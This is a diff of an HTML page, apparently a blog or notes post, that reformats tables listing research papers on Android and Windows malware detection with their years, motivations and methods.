 <td>2020</td>
 <td>Todefeat obfuscation</td>
 <td>Detectingeffectively</td>
 <td>maliciouscommunity</td>
 </tr>
-<tr>
-<td>On the use of artificial malicious patterns for android malware detection</td>
+<tr class="odd">
+<td>On the use of artificial malicious patterns for android malware
+detection</td>
 <td>2020</td>
 <td>Todefeat obfuscation</td>
 <td>Detectingeffectively</td>
 <td>malwarepatterns; Genetic Algorithm (GA); Apriori algorithm</td>
 </tr>
-<tr>
-<td>Andro-Dumpsys: Anti-malware system based on the similarity of malware creator and malware centric information</td>
+<tr class="even">
+<td>Andro-Dumpsys: Anti-malware system based on the similarity of
+malware creator and malware centric information</td>
 <td>2016</td>
 <td>Todefeat packing, dynamic loading etc.</td>
 <td>Detectingeffectively</td>
 <td>similarity matching of malware creator-centric</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>Bayesian Active Malware Analysis</td>
 <td>2020</td>
 <td>None.</td>
@@ -1964,8 +2257,15 @@ github地址：<br>
 </table>
 <h4><span id="242-graph-similarity74-79">2.4.2 Graph similarity[74-79]</span></h4>
 <table>
+<colgroup>
+<col style="width: 30%">
+<col style="width: 2%">
+<col style="width: 23%">
+<col style="width: 12%">
+<col style="width: 30%">
+</colgroup>
 <thead>
-<tr>
+<tr class="header">
 <th>Title</th>
 <th>Year</th>
 <th>Motivation</th>
@@ -1974,54 +2274,66 @@ github地址：<br>
 </tr>
 </thead>
 <tbody>
-<tr>
+<tr class="odd">
 <td>PermPair: Android Malware Detection Using Permission Pairs</td>
 <td>2020</td>
 <td>Tomake use of permission information</td>
 <td>Todetect Android malware</td>
 <td>The comparasion of the graph of permission pairs.</td>
 </tr>
-<tr>
-<td>Apposcopy: Semantics-Based Detection of Android Malware through Static Analysis</td>
+<tr class="even">
+<td>Apposcopy: Semantics-Based Detection of Android Malware through
+Static Analysis</td>
 <td>2014</td>
 <td>Toimprove signature based methods</td>
 <td>Detectingeffectively</td>
-<td>combination of static taint analysis and program representation called Inter-Component Call Graph</td>
+<td>combination of static taint analysis and program representation
+called Inter-Component Call Graph</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>Profiling user-trigger dependence for Android malware detection</td>
 <td>2015</td>
 <td>Tocapture stealthily launch operation</td>
 <td>Detectingeffectively</td>
 <td>Graphcomparision</td>
 </tr>
-<tr>
+<tr class="even">
 <td>Identifying Android Malware Using Network-Based Approaches</td>
 <td>2019</td>
 <td>Tomake use of network information</td>
 <td>Detectingeffectively</td>
 <td>aweighted network to compare closeness</td>
 </tr>
-<tr>
-<td>Cypider: Building Community-Based Cyber-Defense Infrastructure for Android Malware Detection</td>
+<tr class="odd">
+<td>Cypider: Building Community-Based Cyber-Defense Infrastructure for
+Android Malware Detection</td>
 <td>2016</td>
 <td>Todeal with endless new malware</td>
 <td>Detectingeffectively</td>
 <td>scalablesimilarity network infrastructure;malicious community</td>
 </tr>
-<tr>
-<td>Semantics-Aware Android Malware Classification Using Weighted Contextual API Dependency Graphs</td>
+<tr class="even">
+<td>Semantics-Aware Android Malware Classification Using Weighted
+Contextual API Dependency Graphs</td>
 <td>2014</td>
 <td>Tocharacaterize malware from program semantics</td>
 <td>Detectingeffectively</td>
-<td>a weighted contextual API dependency graph as program semantics;graphsimilarity metrics</td>
+<td>a weighted contextual API dependency graph as program
+semantics;graphsimilarity metrics</td>
 </tr>
 </tbody>
 </table>
 <h3><span id="25-ml-based-6080-101">2.5 ML based [60,80-101]</span></h3>
 <table>
+<colgroup>
+<col style="width: 24%">
+<col style="width: 1%">
+<col style="width: 24%">
+<col style="width: 24%">
+<col style="width: 24%">
+</colgroup>
 <thead>
-<tr>
+<tr class="header">
 <th>Title</th>
 <th>Year</th>
 <th>Motivation</th>
@@ -2030,155 +2342,189 @@ github地址：<br>
 </tr>
 </thead>
 <tbody>
-<tr>
-<td><strong>MAMADROID:Detecting Android Malware by Building Markov Chains of Behavioral Models</strong></td>
+<tr class="odd">
+<td><strong>MAMADROID:Detecting Android Malware by Building Markov
+Chains of Behavioral Models</strong></td>
 <td>2017</td>
 <td>Todesign robust malware mitigation techniques</td>
 <td>Constructinga classifier</td>
-<td>BuildingMarkov Chains of Behavioral Models;Random Forests , Nearest Neighbor (1-NN) ,3-Nearest Neighbor (3-NN) ,and Support Vector Machines (SVM)</td>
+<td>BuildingMarkov Chains of Behavioral Models;Random Forests , Nearest
+Neighbor (1-NN) ,3-Nearest Neighbor (3-NN) ,and Support Vector Machines
+(SVM)</td>
 </tr>
-<tr>
-<td><strong>Drebin:Effective and Explainable Detection of Android Malware in Your Pocket</strong></td>
+<tr class="even">
+<td><strong>Drebin:Effective and Explainable Detection of Android
+Malware in Your Pocket</strong></td>
 <td>2014</td>
-<td>Tomitigate the influence on limited resources in Android platform</td>
+<td>Tomitigate the influence on limited resources in Android
+platform</td>
 <td>To propose a lightweight method to detect malware at run-time</td>
 <td>Staticanalysis and SVM</td>
 </tr>
-<tr>
-<td>MakeEvasion Harder: An Intelligent Android Malware Detection System</td>
+<tr class="odd">
+<td>MakeEvasion Harder: An Intelligent Android Malware Detection
+System</td>
 <td>2018</td>
 <td>Todetect evolving Android malware</td>
 <td>Higherdetection rate</td>
 <td>APIcalls and higher-level semantics; SVM</td>
 </tr>
-<tr>
-<td>UsingLoops For Malware Classification Resilient to Feature-unaware Perturbations</td>
+<tr class="even">
+<td>UsingLoops For Malware Classification Resilient to Feature-unaware
+Perturbations</td>
 <td>2018</td>
 <td>Tosolve feature-unaware perturbation</td>
 <td>Todetect malware resilient to feature-unaware perturbation</td>
 <td>Looplocating and random forest</td>
 </tr>
-<tr>
-<td>SemanticModelling of Android Malware for Effective Malware Comprehension, Detection,and Classification</td>
+<tr class="odd">
+<td>SemanticModelling of Android Malware for Effective Malware
+Comprehension, Detection,and Classification</td>
 <td>2016</td>
 <td>Tomake use of semantic information</td>
 <td>Todetect Android malware</td>
 <td>Semanticmodel; Random forest</td>
 </tr>
-<tr>
-<td>Detecting Android Malware Leveraging Text Semantics of Network Flows</td>
+<tr class="even">
+<td>Detecting Android Malware Leveraging Text Semantics of Network
+Flows</td>
 <td>2018</td>
 <td>Tomake use of network information</td>
 <td>Todetect Android malware</td>
 <td>Usingthe text semantics of network traffic; SVM</td>
 </tr>
-<tr>
-<td>Improving Accuracy of Android Malware Detection with Lightweight Contextual Awareness</td>
+<tr class="odd">
+<td>Improving Accuracy of Android Malware Detection with Lightweight
+Contextual Awareness</td>
 <td>2018</td>
 <td>Toreduce redundant metadata in modeling</td>
 <td>ImprovingAccuracy of Android Malware Detection</td>
 <td>KNN;RF;MLP</td>
 </tr>
-<tr>
-<td>MalScan: Fast Market-Wide Mobile Malware Scanning by Social-Network Centrality Analysis</td>
+<tr class="even">
+<td>MalScan: Fast Market-Wide Mobile Malware Scanning by Social-Network
+Centrality Analysis</td>
 <td>2019</td>
 <td>Toreduce the cost of semantic analysis</td>
 <td>To propose a lightweight method to detect malware</td>
 <td>social-network-basedcentrality analysis; kNN and random forest</td>
 </tr>
-<tr>
-<td>PIndroid: A novel Android malware detection system using ensemble learning methods</td>
+<tr class="odd">
+<td>PIndroid: A novel Android malware detection system using ensemble
+learning methods</td>
 <td>2017</td>
 <td>Tofight against covert technique of malware</td>
 <td>Detectingeffectively</td>
-<td>Permissionsand Intents based framework supplemented with Ensemble methods:Nave Bayesian,Decision Tree, Decision Table, Random Forest, Sequential Minimal Optimization and Multi Lateral Perceptron(MLP)</td>
+<td>Permissionsand Intents based framework supplemented with Ensemble
+methods:Nave Bayesian,Decision Tree, Decision Table, Random Forest,
+Sequential Minimal Optimization and Multi Lateral Perceptron(MLP)</td>
 </tr>
-<tr>
+<tr class="even">
 <td>A pragmatic android malware detection procedure</td>
 <td>2017</td>
 <td>Todesign a new ML model</td>
 <td>Detectingeffectively</td>
-<td>Atomic Naive Bayes classifiers used as inputs for the Support Vector Machine ensemble.</td>
+<td>Atomic Naive Bayes classifiers used as inputs for the Support Vector
+Machine ensemble.</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>ICCDetector: ICC-Based Malware Detection on Android</td>
 <td>2016</td>
-<td>Tocapture communication among components or cross boundaries to supplymentfeatures</td>
+<td>Tocapture communication among components or cross boundaries to
+supplymentfeatures</td>
 <td>Detectingeffectively</td>
 <td>SVM</td>
 </tr>
-<tr>
-<td>A Probabilistic Discriminative Model for Android Malware Detection with Decompiled Source Code</td>
+<tr class="even">
+<td>A Probabilistic Discriminative Model for Android Malware Detection
+with Decompiled Source Code</td>
 <td>2015</td>
 <td>None.</td>
 <td>Detectingeffectively</td>
-<td>the 2-class Naive Bayes with Prior (2-PNB) and a discriminative model,the regularized logistic regression</td>
+<td>the 2-class Naive Bayes with Prior (2-PNB) and a discriminative
+model,the regularized logistic regression</td>
 </tr>
-<tr>
-<td>DroidCat: Effective Android Malware Detection and Categorization via App-Level Profiling</td>
+<tr class="odd">
+<td>DroidCat: Effective Android Malware Detection and Categorization via
+App-Level Profiling</td>
 <td>2019</td>
 <td>Tofight against systemcall obfuscation</td>
 <td>Detectingeffectively</td>
-<td>Dynamicanalysis based on method calls and inter-component communication; RandomForest</td>
+<td>Dynamicanalysis based on method calls and inter-component
+communication; RandomForest</td>
 </tr>
-<tr>
-<td>MADAM: Effective and Efficient Behavior-based Android Malware Detection and Prevention</td>
+<tr class="even">
+<td>MADAM: Effective and Efficient Behavior-based Android Malware
+Detection and Prevention</td>
 <td>2018</td>
 <td>None.</td>
 <td>Detectingeffectively</td>
 <td>KNN</td>
 </tr>
-<tr>
-<td>Android Malware Detection via (Somewhat) Robust Irreversible Feature Transformations</td>
+<tr class="odd">
+<td>Android Malware Detection via (Somewhat) Robust Irreversible Feature
+Transformations</td>
 <td>2020</td>
 <td>Toavoid ML classifier evading</td>
 <td>Transferingfeatures to a new feature domain</td>
-<td>Classifiers used:(1) Bernoulli Naive Bayes, (2) Random Forest, (3) NearestNeighbors, (4) Logistic Regression, (5) Gaussian Naive Bayes, (6) AdaBoost Classifier, (7) Gradient Boosting Decision Tree, (8) XGB Classifier and (9)SVM.</td>
+<td>Classifiers used:(1) Bernoulli Naive Bayes, (2) Random Forest, (3)
+NearestNeighbors, (4) Logistic Regression, (5) Gaussian Naive Bayes, (6)
+AdaBoost Classifier, (7) Gradient Boosting Decision Tree, (8) XGB
+Classifier and (9)SVM.</td>
 </tr>
-<tr>
-<td>Leveraging ontologies and machine-learning techniques for malware analysis into Android permissions ecosystems</td>
+<tr class="even">
+<td>Leveraging ontologies and machine-learning techniques for malware
+analysis into Android permissions ecosystems</td>
 <td>2018</td>
 <td>None.</td>
 <td>Detectingeffectively</td>
 <td>ontology-basedframework;random forest</td>
 </tr>
-<tr>
-<td>Lightweight, Obfuscation-Resilient Detection and Family Identification of Android Malware</td>
+<tr class="odd">
+<td>Lightweight, Obfuscation-Resilient Detection and Family
+Identification of Android Malware</td>
 <td>2018</td>
 <td>Todefeat obfuscation</td>
 <td>Detectingeffectively</td>
 <td>familyidentification;linear SVM</td>
 </tr>
-<tr>
-<td>A multi-view context-aware approach to Android malware detection and malicious code localization</td>
+<tr class="even">
+<td>A multi-view context-aware approach to Android malware detection and
+malicious code localization</td>
 <td>2018</td>
 <td>To characaterize malware comprehensively</td>
 <td>Detectingeffectively</td>
 <td>multipleviews of apps;SVM</td>
 </tr>
-<tr>
-<td>DroidFusion: A Novel Multilevel Classifier Fusion Approach for Android Malware Detection</td>
+<tr class="odd">
+<td>DroidFusion: A Novel Multilevel Classifier Fusion Approach for
+Android Malware Detection</td>
 <td>2019</td>
 <td>Toimprove classifier</td>
 <td>Detectingeffectively</td>
-<td>CLASSIFIER FUSION:J48, REPTree, voted perceptron, and random tree</td>
+<td>CLASSIFIER FUSION:J48, REPTree, voted perceptron, and random
+tree</td>
 </tr>
-<tr>
-<td>DL-Droid: Deep learning based android malware detection using real devices</td>
+<tr class="even">
+<td>DL-Droid: Deep learning based android malware detection using real
+devices</td>
 <td>2020</td>
 <td>Todefeat obfuscation</td>
 <td>Detectingeffectively</td>
 <td>input generation;MLP</td>
 </tr>
-<tr>
-<td>JOWMDroid: Android malware detection based on feature weighting with joint optimization of weight-mapping and classifier parameters</td>
+<tr class="odd">
+<td>JOWMDroid: Android malware detection based on feature weighting with
+joint optimization of weight-mapping and classifier parameters</td>
 <td>2021</td>
 <td>Tocharacaterize malware from feature importance</td>
 <td>Detectingeffectively</td>
-<td>featureweighting with the joint optimization of weight-mapping;SVM, LR, MLP</td>
+<td>featureweighting with the joint optimization of weight-mapping;SVM,
+LR, MLP</td>
 </tr>
-<tr>
-<td>Towards using unstructured user input request for malware detection</td>
+<tr class="even">
+<td>Towards using unstructured user input request for malware
+detection</td>
 <td>2020</td>
 <td>Todefeat privacy analysis evading</td>
 <td>Detectingeffectively</td>
@@ -2188,8 +2534,15 @@ github地址：<br>
 </table>
 <h3><span id="26-dl-based-102-109">2.6 DL based [102-109]</span></h3>
 <table>
+<colgroup>
+<col style="width: 32%">
+<col style="width: 2%">
+<col style="width: 32%">
+<col style="width: 11%">
+<col style="width: 22%">
+</colgroup>
 <thead>
-<tr>
+<tr class="header">
 <th>Title</th>
 <th>Year</th>
 <th>Motivation</th>
@@ -2198,57 +2551,66 @@ github地址：<br>
 </tr>
 </thead>
 <tbody>
-<tr>
-<td>Toward s an interpretable deep learning model for mobile malware detection and family identification</td>
+<tr class="odd">
+<td>Toward s an interpretable deep learning model for mobile malware
+detection and family identification</td>
 <td>2021</td>
 <td>Topropose a interpretable DL model</td>
 <td>Detectingreasonablely</td>
 <td>DL:Grad-CAM</td>
 </tr>
-<tr>
-<td>AMalNet: A deep learning framework based on graph convolutional networks for malware detection</td>
+<tr class="even">
+<td>AMalNet: A deep learning framework based on graph convolutional
+networks for malware detection</td>
 <td>2020</td>
 <td>Tohave a lower cost</td>
 <td>Detectingeffectively</td>
 <td>DL:GCNsand IndRNN</td>
 </tr>
-<tr>
-<td>Disentangled Representation Learning in Heterogeneous Information Network for Large-scale Android Malware Detection in the COVID-19 Era and Beyond</td>
+<tr class="odd">
+<td>Disentangled Representation Learning in Heterogeneous Information
+Network for Large-scale Android Malware Detection in the COVID-19 Era
+and Beyond</td>
 <td>2021</td>
-<td>Tosolve the problem that society relys on the complex cyberspace</td>
+<td>Tosolve the problem that society relys on the complex
+cyberspace</td>
 <td>Detectingeffectively</td>
 <td>heterogeneousinformation network (HIN);DNN</td>
 </tr>
-<tr>
-<td>A Multimodal Deep Learning Method for Android Malware Detection Using Various Features</td>
+<tr class="even">
+<td>A Multimodal Deep Learning Method for Android Malware Detection
+Using Various Features</td>
 <td>2019</td>
 <td>Tocharacaterize malware comprehensively</td>
 <td>Detectingeffectively</td>
 <td>multimodaldeep learning method;DNN</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>Android Fragmentation in Malware Detection</td>
 <td>2019</td>
 <td>Todeal with multiple Android version</td>
 <td>Detectingeffectively</td>
 <td>Deep Neural Network</td>
 </tr>
-<tr>
-<td>An Image-inspired and CNN-based Android Malware Detection Approach</td>
+<tr class="even">
+<td>An Image-inspired and CNN-based Android Malware Detection
+Approach</td>
 <td>2019</td>
 <td>Todefeat obfuscation</td>
 <td>Detectingeffectively</td>
 <td>CNN</td>
 </tr>
-<tr>
-<td>A Performance-Sensitive Malware Detection System Using Deep Learning on Mobile Devices</td>
+<tr class="odd">
+<td>A Performance-Sensitive Malware Detection System Using Deep Learning
+on Mobile Devices</td>
 <td>2021</td>
 <td>Toreduce time cost of download and upload</td>
 <td>Detectingfastly</td>
 <td>customized DNN</td>
 </tr>
-<tr>
-<td>Byte-level malware classification based on markov images and deep learning</td>
+<tr class="even">
+<td>Byte-level malware classification based on markov images and deep
+learning</td>
 <td>2020</td>
 <td>Toimprove the accuracy of gray image based methods</td>
 <td>Detectingeffectively</td>
@@ -2258,21 +2620,26 @@ github地址：<br>
 </table>
 <h2><span id="3-windows-malware-detection">3 Windows Malware detection</span></h2>
 <h3><span id="31-behavior-detection-110111">3.1 Behavior detection [110,111]</span></h3>
-<table>
+<table style="width:100%;">
+<colgroup>
+<col style="width: 68%">
+<col style="width: 4%">
+<col style="width: 27%">
+</colgroup>
 <thead>
-<tr>
+<tr class="header">
 <th>Title</th>
 <th>Year</th>
 <th>Creativity</th>
 </tr>
 </thead>
 <tbody>
-<tr>
+<tr class="odd">
 <td>API Chaser: Anti-analysis Resistant Malware Analyzer</td>
 <td>2013</td>
 <td>API call feature capture</td>
 </tr>
-<tr>
+<tr class="even">
 <td>MalViz: An Interactive Visualization Tool for Tracing Malware</td>
 <td>2018</td>
 <td>Behavior visualization</td>
@@ -2281,16 +2648,22 @@ github地址：<br>
 </table>
 <h3><span id="32-signature-based-112">3.2 Signature based [112]</span></h3>
 <table>
+<colgroup>
+<col style="width: 76%">
+<col style="width: 5%">
+<col style="width: 17%">
+</colgroup>
 <thead>
-<tr>
+<tr class="header">
 <th>Title</th>
 <th>Year</th>
 <th>Creativity</th>
 </tr>
 </thead>
 <tbody>
-<tr>
-<td>CloudEyes: Cloud-based malware detection with reversible sketch for resource-constrained internet of things (IoT) devices</td>
+<tr class="odd">
+<td>CloudEyes: Cloud-based malware detection with reversible sketch for
+resource-constrained internet of things (IoT) devices</td>
 <td>2017</td>
 <td>Based on cloud</td>
 </tr>
@@ -2298,16 +2671,22 @@ github地址：<br>
 </table>
 <h3><span id="33-rule-based113">3.3 Rule based[113]</span></h3>
 <table>
+<colgroup>
+<col style="width: 77%">
+<col style="width: 5%">
+<col style="width: 16%">
+</colgroup>
 <thead>
-<tr>
+<tr class="header">
 <th>Title</th>
 <th>Year</th>
 <th>Creativity</th>
 </tr>
 </thead>
 <tbody>
-<tr>
-<td>A fast malware detection algorithm based on objective-oriented association mining</td>
+<tr class="odd">
+<td>A fast malware detection algorithm based on objective-oriented
+association mining</td>
 <td>2013</td>
 <td>API selection</td>
 </tr>
@@ -2316,93 +2695,112 @@ github地址：<br>
 <h3><span id="34-similarity-based">3.4 Similarity based</span></h3>
 <h4><span id="341-model-similarity114-122">3.4.1 Model similarity[114-122]</span></h4>
 <table>
+<colgroup>
+<col style="width: 48%">
+<col style="width: 3%">
+<col style="width: 48%">
+</colgroup>
 <thead>
-<tr>
+<tr class="header">
 <th>Title</th>
 <th>Year</th>
 <th>Creativity</th>
 </tr>
 </thead>
 <tbody>
-<tr>
+<tr class="odd">
 <td>PoMMaDe: Pushdown Model-checking for Malware Detection</td>
 <td>2013</td>
 <td>model checking</td>
 </tr>
-<tr>
+<tr class="even">
 <td>Growing Grapes in Your Computer to Defend Against Malware</td>
 <td>2014</td>
 <td>clustering and template matching</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>Hypervisor-based malware protection with AccessMiner</td>
 <td>2015</td>
 <td>system-centric behavioral detector</td>
 </tr>
-<tr>
-<td>Probabilistic Inference on Integrity for Access Behavior Based Malware Detection</td>
+<tr class="even">
+<td>Probabilistic Inference on Integrity for Access Behavior Based
+Malware Detection</td>
 <td>2015</td>
 <td>probabilistic model of integrity</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>Probabilistic analysis of dynamic malware traces</td>
 <td>2018</td>
 <td>1.Features of system interaction 2. interpretability</td>
 </tr>
-<tr>
+<tr class="even">
 <td>A malware detection method based on family behavior graph</td>
 <td>2018</td>
 <td>common behavior graph</td>
 </tr>
-<tr>
-<td>Malware classification using self organising feature maps and machine activity data</td>
+<tr class="odd">
+<td>Malware classification using self organising feature maps and
+machine activity data</td>
 <td>2018</td>
-<td>1.The improvement of ML. to reduce over-fitting 2. Self Organizing Feature Maps</td>
+<td>1.The improvement of ML. to reduce over-fitting 2. Self Organizing
+Feature Maps</td>
 </tr>
-<tr>
-<td>Volatile memory analysis using the MinHash method for efficient and secured detection of malware in private cloud</td>
+<tr class="even">
+<td>Volatile memory analysis using the MinHash method for efficient and
+secured detection of malware in private cloud</td>
 <td>2019</td>
 <td>Based on memory features</td>
 </tr>
-<tr>
-<td>A dynamic Windows malware detection and prediction method based on contextual understanding of API call sequence</td>
+<tr class="odd">
+<td>A dynamic Windows malware detection and prediction method based on
+contextual understanding of API call sequence</td>
 <td>2020</td>
-<td>1.Contextual relationship between API call features 2. Marcovchain</td>
+<td>1.Contextual relationship between API call features 2.
+Marcovchain</td>
 </tr>
 </tbody>
 </table>
 <h4><span id="342-graph-similarity123-127">3.4.2 Graph similarity[123-127]</span></h4>
 <table>
+<colgroup>
+<col style="width: 55%">
+<col style="width: 3%">
+<col style="width: 40%">
+</colgroup>
 <thead>
-<tr>
+<tr class="header">
 <th>Title</th>
 <th>Year</th>
 <th>Creativity</th>
 </tr>
 </thead>
 <tbody>
-<tr>
+<tr class="odd">
 <td>Deriving common malware behavior through graph clustering</td>
 <td>2013</td>
 <td>common behavior graph</td>
 </tr>
-<tr>
-<td>Enhancing the detection of metamorphic malware using call graphs</td>
+<tr class="even">
+<td>Enhancing the detection of metamorphic malware using call
+graphs</td>
 <td>2014</td>
 <td>API call graph matching</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>Minimal contrast frequent pattern mining for malware detection</td>
 <td>2016</td>
 <td>Graph matching</td>
 </tr>
-<tr>
-<td><strong>Heterogeneous Graph Matching Networks for Unknown Malware Detection</strong></td>
+<tr class="even">
+<td><strong>Heterogeneous Graph Matching Networks for Unknown Malware
+Detection</strong></td>
 <td>2019</td>
 <td>Graph matching similarity of benign software</td>
 </tr>
-<tr>
-<td>Random CapsNet for est model for imbalanced malware type classification task</td>
+<tr class="odd">
+<td>Random CapsNet for est model for imbalanced malware type
+classification task</td>
 <td>2021</td>
 <td>The improvement of the Model</td>
 </tr>
@@ -2410,96 +2808,117 @@ github地址：<br>
 </table>
 <h3><span id="35-ml-based-128-143">3.5 ML based [128-143]</span></h3>
 <table>
+<colgroup>
+<col style="width: 46%">
+<col style="width: 6%">
+<col style="width: 46%">
+</colgroup>
 <thead>
-<tr>
+<tr class="header">
 <th>Title</th>
 <th>Year</th>
 <th>Creativity</th>
 </tr>
 </thead>
 <tbody>
-<tr>
-<td>A Scalable Approach for Malware Detection through Bounded Feature Space Behavior Modeling</td>
+<tr class="odd">
+<td>A Scalable Approach for Malware Detection through Bounded Feature
+Space Behavior Modeling</td>
 <td>2013</td>
 <td>Scalable feature space</td>
 </tr>
-<tr>
+<tr class="even">
 <td>SigMal: A Static Signal Processing Based Malware Triage</td>
 <td>2013</td>
 <td>noise-resistant similarity signatures</td>
 </tr>
-<tr>
-<td>Unsupervised Anomaly-Based Malware Detection Using Hardware Features</td>
+<tr class="odd">
+<td>Unsupervised Anomaly-Based Malware Detection Using Hardware
+Features</td>
 <td>2014</td>
 <td>hardware supported lower-level features</td>
 </tr>
-<tr>
-<td>Control flow-based opcode behavior analysis for Malware detection</td>
+<tr class="even">
+<td>Control flow-based opcode behavior analysis for Malware
+detection</td>
 <td>2014</td>
 <td>Based on control flow method features</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>Employing Program Semantics for Malware Detection</td>
 <td>20152021</td>
-<td>Extracting information-rich call sequence based on AEPThe improvement of the Model</td>
+<td>Extracting information-rich call sequence based on AEPThe
+improvement of the Model</td>
 </tr>
-<tr>
-<td>AMAL: High-fidelity, behavior-based automated malware analysis and classification</td>
+<tr class="even">
+<td>AMAL: High-fidelity, behavior-based automated malware analysis and
+classification</td>
 <td>2015</td>
 <td>Based on behavior analysis</td>
 </tr>
-<tr>
-<td>Optimized Invariant Representation of Network Traffic for Detecting Unseen Malware Variants</td>
+<tr class="odd">
+<td>Optimized Invariant Representation of Network Traffic for Detecting
+Unseen Malware Variants</td>
 <td>2016</td>
 <td>Network features</td>
 </tr>
-<tr>
-<td>DYNAMINER: Leveraging Offline Infection Analytics for On-the-Wire Malware Detection</td>
+<tr class="even">
+<td>DYNAMINER: Leveraging Offline Infection Analytics for On-the-Wire
+Malware Detection</td>
 <td>2017</td>
 <td>Network features</td>
 </tr>
-<tr>
-<td>Security importance assessment for system objects and malware detection</td>
+<tr class="odd">
+<td>Security importance assessment for system objects and malware
+detection</td>
 <td>2017</td>
 <td>Based on importance of system objects</td>
 </tr>
-<tr>
-<td>From big data to knowledge: A spatiotemporal approach to malware detection</td>
+<tr class="even">
+<td>From big data to knowledge: A spatiotemporal approach to malware
+detection</td>
 <td>2018</td>
 <td>cloud based security service features</td>
 </tr>
-<tr>
-<td>From big data to knowledge: A spatiotemporal approach to malware detection</td>
+<tr class="odd">
+<td>From big data to knowledge: A spatiotemporal approach to malware
+detection</td>
 <td>2018</td>
 <td>cloud based security service features</td>
 </tr>
-<tr>
-<td>MalDAE: Detecting and explaining malware based on correlation and fusion of static and dynamic characteristics</td>
+<tr class="even">
+<td>MalDAE: Detecting and explaining malware based on correlation and
+fusion of static and dynamic characteristics</td>
 <td>2019</td>
 <td>fusion of static and dynamic API sequence features</td>
 </tr>
-<tr>
-<td>Leveraging Compression-Based Graph Mining for Behavior-Based Malware Detection</td>
+<tr class="odd">
+<td>Leveraging Compression-Based Graph Mining for Behavior-Based Malware
+Detection</td>
 <td>2019</td>
 <td>Based on data flow graph</td>
 </tr>
-<tr>
-<td>Advanced Windows Methods on Malware Detection and Classification</td>
+<tr class="even">
+<td>Advanced Windows Methods on Malware Detection and
+Classification</td>
 <td>2020</td>
 <td>API based Features extraction.</td>
 </tr>
-<tr>
-<td>Sub-curve HMM: A malware detection approach based on partial analysis of API call sequences</td>
+<tr class="odd">
+<td>Sub-curve HMM: A malware detection approach based on partial
+analysis of API call sequences</td>
 <td>2020</td>
 <td>1.Subset of API call feature 2. HMM</td>
 </tr>
-<tr>
-<td>Multiclass malware classification via first- and second-order texture statistics</td>
+<tr class="even">
+<td>Multiclass malware classification via first- and second-order
+texture statistics</td>
 <td>2020</td>
 <td>visualization</td>
 </tr>
-<tr>
-<td>Catch them alive: A malware detection approach through memory forensics, manifoldlearning and computer vision</td>
+<tr class="odd">
+<td>Catch them alive: A malware detection approach through memory
+forensics, manifoldlearning and computer vision</td>
 <td>2021</td>
 <td>Visualization</td>
 </tr>
@@ -2507,76 +2926,92 @@ github地址：<br>
 </table>
 <h3><span id="36-dl-based-144-156">3.6 DL based [144-156]</span></h3>
 <table>
+<colgroup>
+<col style="width: 57%">
+<col style="width: 3%">
+<col style="width: 39%">
+</colgroup>
 <thead>
-<tr>
+<tr class="header">
 <th>Title</th>
 <th>Year</th>
 <th>Creativity</th>
 </tr>
 </thead>
 <tbody>
-<tr>
-<td>Auto-detection of sophisticated malware using lazy-binding control flow graph and deep learning</td>
+<tr class="odd">
+<td>Auto-detection of sophisticated malware using lazy-binding control
+flow graph and deep learning</td>
 <td>2018</td>
 <td>1.The improvement of CFG 2. Visualizaiton</td>
 </tr>
-<tr>
-<td>Malware identification using visualization images and deep learning</td>
+<tr class="even">
+<td>Malware identification using visualization images and deep
+learning</td>
 <td>2018</td>
 <td>1.SimHash of features 2. Visualization</td>
 </tr>
-<tr>
-<td>Classification of Malware by Using Structural Entropy on Convolutional Neural Networks</td>
+<tr class="odd">
+<td>Classification of Malware by Using Structural Entropy on
+Convolutional Neural Networks</td>
 <td>2018</td>
 <td>visual similarity</td>
 </tr>
-<tr>
-<td>Classifying Malware Represented as Control Flow Graphs using Deep Graph Convolutional Neural Network</td>
+<tr class="even">
+<td>Classifying Malware Represented as Control Flow Graphs using Deep
+Graph Convolutional Neural Network</td>
 <td>2019</td>
 <td>The improvement of CFG</td>
 </tr>
-<tr>
-<td><strong>Neurlux: Dynamic Malware Analysis Without Feature Engineering</strong></td>
+<tr class="odd">
+<td><strong>Neurlux: Dynamic Malware Analysis Without Feature
+Engineering</strong></td>
 <td>2019</td>
 <td>Based on dynamic analysis reports</td>
 </tr>
-<tr>
-<td>A feature-hybrid malware variants detection using CNN based opcode embedding and BPNN based API embedding</td>
+<tr class="even">
+<td>A feature-hybrid malware variants detection using CNN based opcode
+embedding and BPNN based API embedding</td>
 <td>2019</td>
 <td>Hybrid features</td>
 </tr>
-<tr>
+<tr class="odd">
 <td>Effective analysis of malware detection in cloud computing</td>
 <td>2019</td>
 <td>The improvement of the DL.</td>
 </tr>
-<tr>
+<tr class="even">
 <td>Recurrent neural network for detecting malware</td>
 <td>2020</td>
 <td>The improvement of RNN</td>
 </tr>
-<tr>
-<td><strong>Dynamic Malware Analysis with Feature Engineering and Feature Learning</strong></td>
+<tr class="odd">
+<td><strong>Dynamic Malware Analysis with Feature Engineering and
+Feature Learning</strong></td>
 <td>2020</td>
 <td>Feature hashing to encode API call info.</td>
 </tr>
-<tr>
-<td>An improved two-hidden-layer extreme learning machine for malware hunting</td>
+<tr class="even">
+<td>An improved two-hidden-layer extreme learning machine for malware
+hunting</td>
 <td>2020</td>
 <td>Improvement of the DL.</td>
 </tr>
-<tr>
-<td>HYDRA: A multimodal deep learning framework for malware classification</td>
+<tr class="odd">
+<td>HYDRA: A multimodal deep learning framework for malware
+classification</td>
 <td>2020</td>
 <td>Hybrid features</td>
 </tr>
-<tr>
-<td>A novel method for malware detection on ML-based visualization technique</td>
+<tr class="even">
+<td>A novel method for malware detection on ML-based visualization
+technique</td>
 <td>2020</td>
 <td>visualization</td>
 </tr>
-<tr>
-<td>Image-Based malware classification using ensemble of CNN architectures (IMCEC)</td>
+<tr class="odd">
+<td>Image-Based malware classification using ensemble of CNN
+architectures (IMCEC)</td>
 <td>2020</td>
 <td>visualization</td>
 </tr>
@@ -2595,475 +3030,308 @@ github地址：<br>
 <li>Methods reproduction [59]</li>
 </ul>
 <h2><span id="5-references">5. References</span></h2>
-<ol>
-<li>
-<p>2014 A Survey of Android Malware Characterisitics and Mitigation Techniques</p>
-</li>
-<li>
-<p>2014 Smartphone Malware and Its Propagation Modeling:A Survey</p>
-</li>
-<li>
